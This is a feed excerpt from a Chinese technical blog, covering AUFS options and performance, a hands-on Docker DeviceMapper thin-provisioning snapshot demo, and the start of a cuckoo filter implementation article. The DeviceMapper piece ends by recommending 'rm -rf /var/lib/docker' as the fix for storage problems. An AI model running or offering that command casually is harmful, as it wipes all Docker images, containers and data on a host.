<li>如果UnionFS中的某个目录被删除了，那么就应该不可见了，就算是在底层的branch中还有这个目录，那也应该不可见了。</li>
</ul>
<ul>
<li>Whiteout就是某个上层目录覆盖了下层的相同名字的目录。用于隐藏低层分支的文件，也用于阻止readdir进入低层分支。</li>
</ul>
<ul>
<li>Opaque的意思就是不允许任何下层的某个目录显示出来。</li>
</ul>
<ul>
<li>在隐藏低层档的情况下，whiteout的名字是’.wh.&lt;filename&gt;’。</li>
</ul>
<ul>
<li>在阻止readdir的情况下，名字是’.wh..wh..opq’或者 ’.wh.__dir_opaque’。</li>
</ul>
<h5>
<span class="ez-toc-section" id="%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"></span>相关问题<span class="ez-toc-section-end"></span>
</h5>
<p>看到上面这些，你一定会有几个问题：</p>
<p><strong>其一、你可能会问，要有文件在原来的地方被修改了会怎么样？</strong>mount的目录会一起改变吗？答案是会的，也可以是不会的。因为你可以指定一个叫udba的参数（全称：User’s Direct Branch Access），这个参数有三个取值：</p>
<ul>
<li>
<strong>udba=none</strong> – 设置上这个参数后，AUFS会运转的更快，因为那些不在mount目录里发生的修改，aufs不会同步过来了，所以会有数据出错的问题。</li>
<li>
<strong>udba=reval</strong> – 设置上这个参数后，AUFS会去查文件有没有被更新，如果有的话，就会把修改拉到mount目录内。</li>
<li>
<strong>udba=notify</strong> – 这个参数会让AUFS为所有的branch注册inotify，这样可以让AUFS在更新文件修改的性能更高一些。</li>
</ul>
<p><strong>其二、如果有多个rw的branch（目录）被union起来了，那么，当我创建文件的时候，aufs会创建在哪里呢？</strong> aufs提供了一个叫create的参数可以供你来配置相当的创建策略，下面有几个例子。</p>
<p><strong>create=rr | round−robin</strong> 轮询。下面的示例可以看到，新创建的文件轮流写到三个目录中</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">hchen$ sudo mount -t aufs  -o dirs=./1=rw:./2=rw:./3=rw -o create=rr none ./mnt
hchen$ touch ./mnt/a ./mnt/b ./mnt/c
hchen$ tree
.
├── 1
│   └── a
├── 2
│   └── c
└── 3
    └── b</pre>
<p><strong>create=mfs[:second] | most−free−space[:second]</strong> 选一个可用空间最好的分支。可以指定一个检查可用磁盘空间的时间。</p>
<p><strong>create=mfsrr:low[:second]</strong> 选一个空间大于low的branch，如果空间小于low了，那么aufs会使用 round-robin 方式。</p>
<p>更多的关于AUFS的细节使用参数，大家可以直接在Ubuntu 14.04下通过<a href="http://aufs.sourceforge.net/aufs3/man.html" target="_blank"> man aufs </a>来看一下其中的各种参数和命令。</p>
<h4>
<span class="ez-toc-section" id="AUFS%E7%9A%84%E6%80%A7%E8%83%BD"></span>AUFS的性能<span class="ez-toc-section-end"></span>
</h4>
<p>AUFS的性能慢吗？也慢也不慢。因为AUFS会把所有的分支mount起来，所以，在查找文件上是比较慢了。因为它要遍历所有的branch。是个O(n)的算法（很明显，这个算法有很大的改进空间的）所以，branch越多，查找文件的性能也就越慢。但是，一旦AUFS找到了这个文件的inode，那后以后的读写和操作原文件基本上是一样的。</p>
<p>所以，如果你的程序跑在在AUFS下，open和stat操作会有明显的性能下降，branch越多，性能越差，但是在write/read操作上，性能没有什么变化。</p>
<p>IBM的研究中心对Docker的性能给了一份非常不错的性能报告（PDF）《<a href="http://domino.research.ibm.com/library/cyberdig.nsf/papers/0929052195DD819C85257D2300681E7B/%24File/rc25482.pdf" target="_blank">An Updated Performance Comparison of Virtual Machinesand Linux Containers</a>》</p>
<p>我截了两张图出来，第一张是顺序读写，第二张是随机读写。基本没有什么性能损失的问题。而KVM在随机读写的情况也就有点慢了（但是，如果硬盘是SSD的呢？）</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2015/08/docker.seq_.jpg"><img alt="image placeholder" ></a></p>
<p> </p>
<p style="text-align: center;"><strong>顺序读写</strong></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2015/08/docker.rand_.jpg"><img alt="image placeholder" ></a></p>
<p> </p>
<p style="text-align: center;"><strong>随机读写</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%BB%B6%E4%BC%B8%E9%98%85%E8%AF%BB"></span>延伸阅读<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://www.linuxjournal.com/article/7714" target="_blank">Introduce UnionFS</a></li>
<li><a href="https://lwn.net/Articles/325369/" target="_blank">Union file systems: Implementations, part I</a></li>
<li><a href="https://lwn.net/Articles/327738/" target="_blank">Union file systems: Implementations, part 2</a></li>
<li><a href="https://lwn.net/Articles/403012/" target="_blank">Another union filesystem approach</a></li>
<li><a href="https://lwn.net/Articles/324291/" target="_blank">Unioning file systems: Architecture, features, and design choices</a></li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-08-24T08:01:13+08:00</pubDate>
<guid>https://coolshell.cn/articles/17061.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Docker基础技术：DeviceMapper ]]></title>
<link>https://coolshell.cn/articles/17200.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >在上一篇<a href="https://coolshell.cn/articles/17061.html" target="_blank">介绍AUFS的文章</a>中，大家可以看到，Docker的分层镜像是怎么通过UnionFS这种文件系统做到的，但是，因为Docker首选的AUFS并不在Linux的内核主干里，所以，对于非Ubuntu的Linux分发包，比如CentOS，就无法使用AUFS作为Docker的文件系统了。于是作为第二优先级的DeviceMapper就被拿出来做分层镜像的一个实现。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Device_Mapper_%E7%AE%80%E4%BB%8B" title="Device Mapper 简介">Device Mapper 简介</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Thin_Provisioning_%E7%AE%80%E4%BB%8B" title="Thin Provisioning 简介">Thin Provisioning 简介</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Thin_Provisioning_Snapshot_%E6%BC%94%E7%A4%BA" title="Thin Provisioning Snapshot 演示">Thin Provisioning Snapshot 演示</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Docker%E7%9A%84DeviceMapper" title="Docker的DeviceMapper">Docker的DeviceMapper</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Device_Mapper_%E8%A1%8C%E4%B8%8D%E8%A1%8C%EF%BC%9F" title="Device Mapper 行不行？">Device Mapper 行不行？</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Device_Mapper_%E7%AE%80%E4%BB%8B"></span>Device Mapper 简介<span class="ez-toc-section-end"></span>
</h4>
<p>DeviceMapper自Linux 2.6被引入成为了Linux最重要的一个技术。它在内核中支持逻辑卷管理的通用设备映射机制，它为实现用于存储资源管理的块设备驱动提供了一个高度模块化的内核架构，它包含三个重要的对象概念，Mapped Device、Mapping Table、Target device。</p>
<p>Mapped Device 是一个逻辑抽象，可以理解成为内核向外提供的逻辑设备，它通过Mapping Table描述的映射关系和 Target Device 建立映射。Target device 表示的是 Mapped Device 所映射的物理空间段，对 Mapped Device 所表示的逻辑设备来说，就是该逻辑设备映射到的一个物理设备。</p>
<p>Mapping Table里有 Mapped Device 逻辑的起始地址、范围、和表示在 Target Device 所在物理设备的地址偏移量以及Target 类型等信息（注：这些地址和偏移量都是以磁盘的扇区为单位的，即 512 个字节大小，所以，当你看到128的时候，其实表示的是128*512=64K）。</p>
<p><span id="more-17200"></span></p>
<p>DeviceMapper 中的逻辑设备Mapped Device不但可以映射一个或多个物理设备Target Device，还可以映射另一个Mapped Device，于是，就是构成了一个迭代或递归的情况，就像文件系统中的目录里除了文件还可以有目录，理论上可以无限嵌套下去。</p>
<p>DeviceMapper在内核中通过一个一个模块化的 Target Driver 插件实现对 IO 请求的过滤或者重新定向等工作，当前已经实现的插件包括软 Raid、加密、多路径、镜像、快照等，这体现了在 Linux 内核设计中策略和机制分离的原则。如下图所示。从图中，我们可以<strong>看到DeviceMapper只是一个框架，在这个框架上，我们可以插入各种各样的策略</strong>（让我不自然地想到了面向对象中的策略模式），在这诸多“插件”中，<strong>有一个东西叫Thin Provisioning Snapshot，这是Docker使用DeviceMapper中最重要的模块</strong>。</p>
<figure id="attachment_17204" aria-describedby="caption-attachment-17204" style="width: 640px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-17204" class="wp-caption-text">图片来源：<a href="https://people.redhat.com/agk/talks/FOSDEM_2005/" target="_blank">http://people.redhat.com/agk/talks/FOSDEM_2005/</a></figcaption></figure>
<h4>
<span class="ez-toc-section" id="Thin_Provisioning_%E7%AE%80%E4%BB%8B"></span><strong>Thin Provisioning 简介</strong><span class="ez-toc-section-end"></span>
</h4>
<p>Thin Provisioning要怎么翻译成中文，真是一件令人头痛的事，我就不翻译了。这个技术是虚拟化技术中的一种。它是什么意思呢？<strong>你可以联想一下我们计算机中的内存管理中用到的——“虚拟内存技术”</strong>——操作系统给每个进程N多N多用不完的内址地址（32位下，每个进程可以有最多2GB的内存空间），但是呢，我们知道，物理内存是没有那么多的，如果按照进程内存和物理内存一一映射来玩的话，那么，我们得要多少的物理内存啊。所以，操作系统引入了虚拟内存的设计，<strong>意思是，我逻辑上给你无限多的内存，但是实际上是实报实销</strong>，因为我知道你一定用不了那么多，于是，达到了内存使用率提高的效果。（今天云计算中很多所谓的虚拟化其实完全都是在用和“虚拟内存”相似的Thin Provisioning的技术，所谓的超配，或是超卖）</p>
<p> </p>
<p>好了，话题拉回来，我们这里说的是存储。看下面两个图（<a href="http://www.architecting.it/2009/06/04/enterprise-computing-why-thin-provisioning-is-not-the-holy-grail-for-utilisation/" target="_blank">图片来源</a>），第一个是Fat Provisioning，第二个是Thin Provisioning，其很好的说明了是个怎么一回事（和虚拟内存是一个概念）</p>
<p><img alt="image placeholder" > <img alt="image placeholder" ></p>
<p>那么，Docker是怎么使用Thin Provisioning这个技术做到像UnionFS那样的分层镜像的呢？答案是，Docker使用了Thin Provisioning的Snapshot的技术。下面我们来介绍一下Thin Provisioning的Snapshot。</p>
<h4>
<span class="ez-toc-section" id="Thin_Provisioning_Snapshot_%E6%BC%94%E7%A4%BA"></span>Thin Provisioning Snapshot 演示<span class="ez-toc-section-end"></span>
</h4>
<p>下面，我们用一系列的命令来演示一下Device Mapper的Thin Provisioning Snapshot是怎么玩的。</p>
<p>首先，我们需要先建两个文件，一个是data.img，一个是meta.data.img：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo dd if=/dev/zero of=/tmp/data.img bs=1K count=1 seek=10M
1+0 records in
1+0 records out
1024 bytes (1.0 kB) copied, 0.000621428 s, 1.6 MB/s

~hchen$ sudo dd if=/dev/zero of=/tmp/meta.data.img bs=1K count=1 seek=1G
1+0 records in
1+0 records out
1024 bytes (1.0 kB) copied, 0.000140858 s, 7.3 MB/s</pre>
<p>注意命令中<code>seek</code>选项，其表示为略过<code>of</code>选项指定的输出文件的前10G个output的bloksize的空间后再写入内容。因为bs是1个字节，所以也就是10G的尺寸，但其实在硬盘上是没有占有空间的，占有空间只有1k的内容。当向其写入内容时，才会在硬盘上为其分配空间。我们可以用ls命令看一下，实际分配了12K和4K。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo ls -lsh /tmp/data.img
12K -rw-r--r--. 1 root root 11G Aug 25 23:01 /tmp/data.img

~hchen$ sudo ls -slh /tmp/meta.data.img
4.0K -rw-r--r--. 1 root root 101M Aug 25 23:17 /tmp/meta.data.img</pre>
<p>然后，我们为这个文件创建一个loopback设备。（loop2015和loop2016是我乱取的两个名字）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo losetup /dev/loop2015 /tmp/data.img
~hchen$ sudo losetup /dev/loop2016 /tmp/meta.data.img

~hchen$ sudo losetup -a
/dev/loop2015: [64768]:103991768 (/tmp/data.img)
/dev/loop2016: [64768]:103991765 (/tmp/meta.data.img)</pre>
<p>现在，我们为这个设备建一个Thin Provisioning的Pool，用dmsetup命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo dmsetup create hchen-thin-pool \
                  --table "0 20971522 thin-pool /dev/loop2016 /dev/loop2015 \
                           128 65536 1 skip_block_zeroing"</pre>
<p>其中的参数解释如下（更多信息可参看<a href="https://github.com/torvalds/linux/blob/master/Documentation/device-mapper/thin-provisioning.txt" target="_blank">Thin Provisioning的man page</a>）：</p>
<ul>
<li>dmsetup create是用来创建thin pool的命令</li>
<li>hchen-thin-pool 是自定义的一个pool名，不冲突就好。</li>
<li>–table是这个pool的参数设置
<ul>
<li>0代表起的sector位置</li>
<li>20971522代码结句的sector号，前面说过，一个sector是512字节，所以，20971522个正好是10GB</li>
<li>/dev/loop2016是meta文件的设备（前面我们建好了）</li>
<li>/dev/loop2015是data文件的设备（前面我们建好了）</li>
<li>128是最小的可分配的sector数</li>
<li>65536是最少可用sector的water mark，也就是一个threshold</li>
<li>1 代表有一个附加参数</li>
<li>skip_block_zeroing是个附加参数，表示略过用0填充的块</li>
</ul>
</li>
</ul>
<p>然后，我们就可以看到一个Device Mapper的设备了：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo ll /dev/mapper/hchen-thin-pool
lrwxrwxrwx. 1 root root 7 Aug 25 23:24 /dev/mapper/hchen-thin-pool -&gt; ../dm-4</pre>
<p>接下来，我们的初始还没有完成，还要创建一个Thin Provisioning 的 Volume：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 "create_thin 0"
~hchen$ sudo dmsetup create hchen-thin-volumn-001 \
            --table "0 2097152 thin /dev/mapper/hchen-thin-pool 0"</pre>
<p>其中：</p>
<ul>
<li>第一个命令中的create_thin是关键字，后面的0表示这个Volume的device 的 id</li>
<li>第二个命令，是真正的为这个Volumn创建一个可以mount的设备，名字叫hchen-thin-volumn-001。2097152只有1GB</li>
</ul>
<p>好了，在mount前，我们还要格式化一下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo mkfs.ext4 /dev/mapper/hchen-thin-volumn-001
mke2fs 1.42.9 (28-Dec-2013)
Discarding device blocks: done
Filesystem label=
OS type: Linux
Block size=4096 (log=2)
Fragment size=4096 (log=2)
Stride=16 blocks, Stripe width=16 blocks
65536 inodes, 262144 blocks
13107 blocks (5.00%) reserved for the super user
First data block=0
Maximum filesystem blocks=268435456
8 block groups
32768 blocks per group, 32768 fragments per group
8192 inodes per group
Superblock backups stored on blocks:
32768, 98304, 163840, 229376

Allocating group tables: done
Writing inode tables: done
Creating journal (8192 blocks): done
Writing superblocks and filesystem accounting information: done</pre>
<p>好了，我们可以mount了（下面的命令中，我还创建了一个文件）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo mkdir -p /mnt/base
~hchen$ sudo mount /dev/mapper/hchen-thin-volumn-001 /mnt/base
~hchen$ sudo echo "hello world, I am a base" &gt; /mnt/base/id.txt
~hchen$ sudo cat /mnt/base/id.txt
hello world, I am a base</pre>
<p>好了，接下来，我们来看看snapshot怎么搞：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 "create_snap 1 0"
~hchen$ sudo dmsetup create mysnap1 \
                   --table "0 2097152 thin /dev/mapper/hchen-thin-pool 1"

~hchen$ sudo ll /dev/mapper/mysnap1
lrwxrwxrwx. 1 root root 7 Aug 25 23:49 /dev/mapper/mysnap1 -&gt; ../dm-5</pre>
<p>上面的命令中：</p>
<ul>
<li>第一条命令是向hchen-thin-pool发一个create_snap的消息，后面跟两个id，第一个是新的dev id，第二个是要从哪个已有的dev id上做snapshot（0这个dev id是我们前面就创建了了）</li>
</ul>
<ul>
<li>第二条命令是创建一个mysnap1的device，并可以被mount。</li>
</ul>
<p>下面我们来看看：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo mkdir -p /mnt/mysnap1
~hchen$ sudo mount /dev/mapper/mysnap1 /mnt/mysnap1

~hchen$ sudo ll /mnt/mysnap1/
total 20
-rw-r--r--. 1 root root 25 Aug 25 23:46 id.txt
drwx------. 2 root root 16384 Aug 25 23:43 lost+found

~hchen$ sudo cat /mnt/mysnap1/id.txt
hello world, I am a base</pre>
<p>我们来修改一下/mnt/mysnap1/id.txt，并加上一个snap1.txt的文件：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo echo "I am snap1" &gt;&gt; /mnt/mysnap1/id.txt
~hchen$ sudo echo "I am snap1" &gt; /mnt/mysnap1/snap1.txt

~hchen$ sudo cat /mnt/mysnap1/id.txt
hello world, I am a base
I am snap1

~hchen$ sudo cat /mnt/mysnap1/snap1.txt
I am snap1</pre>
<p>我们再看一下/mnt/base，你会发现没有什么变化：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo ls /mnt/base
id.txt      lost+found
~hchen$ sudo cat /mnt/base/id.txt
hello world, I am a base</pre>
<p>你是不是已经看到了分层镜像的样子了？</p>
<p>你还要吧继续在刚才的snapshot上再建一个snapshot</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 "create_snap 2 1"
~hchen$ sudo dmsetup create mysnap2 \
                   --table "0 2097152 thin /dev/mapper/hchen-thin-pool 2"

~hchen$ sudo ll /dev/mapper/mysnap2
lrwxrwxrwx. 1 root root 7 Aug 25 23:52 /dev/mapper/mysnap1 -&gt; ../dm-7

~hchen$ sudo mkdir -p /mnt/mysnap2
~hchen$ sudo mount /dev/mapper/mysnap2 /mnt/mysnap2
~hchen$ sudo  ls /mnt/mysnap2
id.txt  lost+found  snap1.txt </pre>
<p>好了，我相信你看到了分层镜像的样子了。</p>
<p>看完演示，我们再来补点理论知识吧：</p>
<ul>
<li>Snapshot来自LVM（Logic Volumn Manager），它可以在不中断服务的情况下为某个device打一个快照。</li>
<li>Snapshot是Copy-On-Write的，也就是说，只有发生了修改，才会对对应的内存进行拷贝。</li>
</ul>
<p>另外，这里有篇文章<a href="http://searchstorage.techtarget.com/tip/Storage-thin-provisioning-benefits-and-challenges" target="_blank">Storage thin provisioning benefits and challenges</a>可以前往一读。</p>
<h4>
<span class="ez-toc-section" id="Docker%E7%9A%84DeviceMapper"></span>Docker的DeviceMapper<span class="ez-toc-section-end"></span>
</h4>
<p>上面基本上就是Docker的玩法了，我们可以看一下docker的loopback设备：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen $ sudo losetup -a
/dev/loop0: [64768]:38050288 (/var/lib/docker/devicemapper/devicemapper/data)
/dev/loop1: [64768]:38050289 (/var/lib/docker/devicemapper/devicemapper/metadata)</pre>
<p>其中data 100GB，metadata 2.0GB</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen $ sudo ls -alhs /var/lib/docker/devicemapper/devicemapper
506M -rw-------. 1 root root 100G Sep 10 20:15 data
1.1M -rw-------. 1 root root 2.0G Sep 10 20:15 metadata </pre>
<p>下面是相关的thin-pool。其中，有个当一大串hash串的device是正在启动的容器：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen $ sudo ll /dev/mapper/dock*
lrwxrwxrwx. 1 root root 7 Aug 25 07:57 /dev/mapper/docker-253:0-104108535-pool -&gt; ../dm-2
lrwxrwxrwx. 1 root root 7 Aug 25 11:13 /dev/mapper/docker-253:0-104108535-deefcd630a60aa5ad3e69249f58a68e717324be4258296653406ff062f605edf -&gt; ../dm-3</pre>
<p>我们可以看一下它的device id（Docker都把它们记下来了）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen $ sudo cat /var/lib/docker/devicemapper/metadata/deefcd630a60aa5ad3e69249f58a68e717324be4258296653406ff062f605edf
{"device_id":24,"size":10737418240,"transaction_id":26,"initialized":false}</pre>
<p>device_id是24，size是10737418240，除以512，就是20971520 个 sector，我们用这些信息来做个snapshot看看（注：我用了一个比较大的dev id – 1024）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">~hchen$ sudo dmsetup message "/dev/mapper/docker-253:0-104108535-pool" 0 \
                                    "create_snap 1024 24"
~hchen$ sudo dmsetup create dockersnap --table \
                    "0 20971520 thin /dev/mapper/docker-253:0-104108535-pool 1024"
~hchen$ sudo mkdir /mnt/docker
~hchen$ sudo mount /dev/mapper/dockersnap /mnt/docker/
~hchen$ sudo ls /mnt/docker/
id lost+found rootfs
~hchen$ sudo ls /mnt/docker/rootfs/
bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var</pre>
<p>我们在docker的容器里用findmnt命令也可以看到相关的mount的情况（因为太长，下面只是摘要）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># findmnt
TARGET                SOURCE               
/                 /dev/mapper/docker-253:0-104108535-deefcd630a60[/rootfs]
/etc/resolv.conf  /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/resolv.conf]
/etc/hostname     /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/hostname]
/etc/hosts        /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/hosts]</pre>
<h4>
<span class="ez-toc-section" id="Device_Mapper_%E8%A1%8C%E4%B8%8D%E8%A1%8C%EF%BC%9F"></span>Device Mapper 行不行？<span class="ez-toc-section-end"></span>
</h4>
<p>Thin Provisioning的文档中说，这还处理实验阶段，不要上Production.</p>
<blockquote><p>These targets are very much still in the EXPERIMENTAL state. Please do not yet rely on them in production.</p></blockquote>
<p>另外，Jeff Atwood在Twitter上发过这样的一推</p>
<p><a href="https://twitter.com/codinghorror/status/604096348682485760"><img alt="image placeholder" ></a></p>
<p>这个推指向的<a href="https://forums.docker.com/t/rmi-not-freeing-disk-space-in-devicemapper-sparse-file-centos-6-6/1640/3" target="_blank">这个讨论</a>中，其中指向了这个<a href="https://github.com/discourse/discourse_docker/commit/48f22d14f39496c8df446cbc65ee04b258c5a1a0" target="_blank">code diff</a>，基本上就是说，DeviceMapper这种东西问题太多了，我们应该把其加入黑名单。Doker的Founder也这样回复到：</p>
<p><a href="https://twitter.com/solomonstre/status/604055267303636992"><img alt="image placeholder" ></a></p>
<p>所以，如果你在使用loopback的devicemapper的话，当你的存储出现了问题后，正确的解决方案是：</p>
<p style="text-align: center;">rm -rf /var/lib/docker</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-08-26T08:21:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/17200.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Cuckoo Filter：设计与实现 ]]></title>
<link>https://coolshell.cn/articles/17225.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p><img alt="image placeholder" ></p>
<p>对于海量数据处理业务，我们通常需要一个索引数据结构，用来帮助查询，快速判断数据记录是否存在，这种数据结构通常又叫过滤器(filter)。考虑这样一个场景，上网的时候需要在浏览器上输入URL，这时浏览器需要去判断这是否一个恶意的网站，它将对本地缓存的成千上万的URL索引进行过滤，如果不存在，就放行，如果（可能）存在，则向远程服务端发起验证请求，并回馈客户端给出警告。</p>
<p>索引的存储又分为有序和无序，前者使用关联式容器，比如B树，后者使用哈希算法。这两类算法各有优劣：比如，关联式容器时间复杂度稳定O(logN)，且支持范围查询；又比如哈希算法的查询、增删都比较快O(1)，但这是在理想状态下的情形，遇到碰撞严重的情况，哈希算法的时间复杂度会退化到O(n)。因此，选择一个好的哈希算法是很重要的。</p>
<p>时下一个非常流行的哈希索引结构就是<strong><a href="https://en.wikipedia.org/wiki/Bloom_filter" target="_blank">bloom filter</a></strong>，它类似于bitmap这样的hashset，所以空间利用率很高。其独特的地方在于它使用多个哈希函数来避免哈希碰撞，如图所示（<a href="https://en.wikipedia.org/wiki/Bloom_filter" target="_blank">来源wikipedia</a>），bit数组初始化为全0，插入x时，x被3个哈希函数分别映射到3个不同的bit位上并置1，查询x时，只有被这3个函数映射到的bit位全部是1才能说明x可能存在，但凡至少出现一个0表示x肯定不存在。</p>
<p><img alt="image placeholder" ></p>
<p><span id="more-17225"></span></p>
<p>但是，bloom filter的这种位图模式带来两个问题：一个是<strong>误报（false positives）</strong>，在查询时能提供“一定不存在”，但只能提供“可能存在”，因为存在其它元素被映射到部分相同bit位上，导致该位置1，那么一个不存在的元素可能会被误报成存在；另一个是<strong>漏报（false nagatives）</strong>，同样道理，如果删除了某个元素，导致该映射bit位被置0，那么本来存在的元素会被漏报成不存在。由于后者问题严重得多，所以bloom filter必须确保“definitely no”从而容忍“probably yes”，不允许元素的删除。</p>
<p>关于元素删除的问题，一个改良方案是对bloom filter引入计数，但这样一来，原来每个bit空间就要扩张成一个计数值，空间效率上又降低了。</p>
<h4>Cuckoo Hashing</h4>
<p>为了解决这一问题，本文引入了一种新的哈希算法——<strong>cuckoo filter</strong>，它既可以确保该元素存在的必然性，又可以在不违背此前提下删除任意元素，仅仅比bitmap牺牲了微量空间效率。先说明一下，这个算法的思想来源是一篇<a href="https://www.cs.cmu.edu/~binfan/papers/conext14_cuckoofilter.pdf" target="_blank">CMU论文</a>，笔者按照其思路用C语言做了一个简单实现（<a href="https://github.com/begeekmyfriend/CuckooFilter" target="_blank">Github</a>），附上对一段文本数据进行导入导出的正确性测试。</p>
<p>接下来我会结合自己的示例代码讲解哈希算法的实现。我们先来看看cuckoo hashing有什么特点，它的哈希函数是成对的（具体的实现可以根据需求设计），每一个元素都是两个，分别映射到两个位置，一个是记录的位置，另一个是备用位置。这个备用位置是处理碰撞时用的，这就要说到cuckoo这个名词的典故了，中文名叫布谷鸟，这种鸟有一种即狡猾又贪婪的习性，它不肯自己筑巢，而是把蛋下到别的鸟巢里，而且它的幼鸟又会比别的鸟早出生，布谷幼鸟天生有一种残忍的动作，幼鸟会拼命把未出生的其它鸟蛋挤出窝巢，今后以便独享“养父母”的食物。借助生物学上这一典故，cuckoo hashing处理碰撞的方法，就是把原来占用位置的这个元素踢走，不过被踢出去的元素还要比鸟蛋幸运，因为它还有一个备用位置可以安置，如果备用位置上还有人，再把它踢走，如此往复。直到被踢的次数达到一个上限，才确认哈希表已满，并执行rehash操作。如下图所示（<a href="http://codecapsule.com/2013/07/20/cuckoo-hashing/" target="_blank">图片来源</a>）：</p>
<p><a href="http://codecapsule.com/2013/07/20/cuckoo-hashing/"><img alt="image placeholder" ></a></p>
<p> </p>
<p>我们不禁要问发生哈希碰撞之前的空间利用率是多少呢？不幸地告诉你，一维数组的哈希表上跟其它哈希函数没什么区别，也就50%而已。但如果是二维的呢？</p>
<p>一个改进的哈希表如下图所示，每个桶（bucket）有4路槽位（slot）。当哈希函数映射到同一个bucket中，在其它三路slot未被填满之前，是不会有元素被踢的，这大大缓冲了碰撞的几率。笔者自己的简单实现上测过，采用二维哈希表（4路slot）大约80%的占用率（CMU论文数据据说达到90%以上，应该是扩大了slot关联数目所致）。</p>
<p><img alt="image placeholder" ></p>
<h4>Cuckoo Filter设计与实现</h4>
<p>cuckoo hashing的原理介绍完了，下面就来演示一下笔者自己实现的一个cuckoo filter应用，简单易用为主，不到500行C代码。应用场景是这样的：假设有一段文本数据，我们把它通过cuckoo filter导入到一个虚拟的flash中，再把它导出到另一个文本文件中。flash存储的单元页面是一个log_entry，里面包含了一对key/value，value就是文本数据，key就是这段大小的数据的SHA1值（照理说SHA1是可以通过数据源生成，没必要存储到flash，但这里主要为了测试而故意设计的，万一key和value之间没有推导关系呢）。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define SECTOR_SIZE    (1 &lt;&lt; 10)
#define DAT_LEN        (SECTOR_SIZE - 20)  /* minus sha1 size */

/* The log entries store key-value pairs on flash and the
 * size of each entry is assumed just one sector fit.
 */
struct log_entry {
        uint8_t sha1[20];
        uint8_t data[DAT_LEN];
};
</pre>
<p>顺便说明一下DAT_LEN设置，之前我们设计了一个虚拟flash（用malloc模拟出来），由于flash的单位是按页大小SECTOR_SIZE读写，这里假设每个log_entry正好一个页大小，当然可以根据实际情况调整。</p>
